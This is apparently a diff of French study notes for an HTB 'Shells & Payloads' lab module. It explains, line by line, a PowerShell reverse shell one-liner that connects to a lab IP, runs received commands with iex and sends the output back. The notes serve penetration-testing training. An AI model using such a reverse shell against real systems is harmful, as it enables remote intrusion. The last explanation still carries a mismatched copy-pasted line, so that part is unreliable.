@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T20:15:17.776Z
+date: 2025-05-17T20:26:12.849Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -215,13 +215,13 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
    lance une boucle while où la variable `$i` est initialisée avec le résultat de la méthode `Read` du flux ([`$stream.Read`](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)). Cette méthode lit des données dans le buffer `$bytes`, à partir de l’offset 0, pour une longueur égale à la taille de `$bytes`.
 
 1. **`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+    Définit la variable `$data` en lui assignant une instance de classe du framework .NET pour l’encodage ASCII, qui sera utilisée avec la méthode GetString pour convertir le flux de bytes ($bytes) en texte ASCII. En résumé, ce que nous tapons sera encodé en texte ASCII.
 
 1. **`$sendback = (iex $data 2>&1 | Out-String );`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   Définit/évalue la variable `$sendback` en lui assignant le résultat de la commande `Invoke-Expression` avec la variable `$data`, puis redirige la sortie d’erreur standard et la sortie standard via un pipe vers la commande `Out-String` qui convertit les objets en chaînes de caractères.
 
 1. **`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   Définit la variable `$sendback2` en lui assignant la variable `$sendback` concaténé avec la chaîne de caractères `PS` et le chemin du répertoire de travail courant et le caractère `>`.
 
 1. **`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
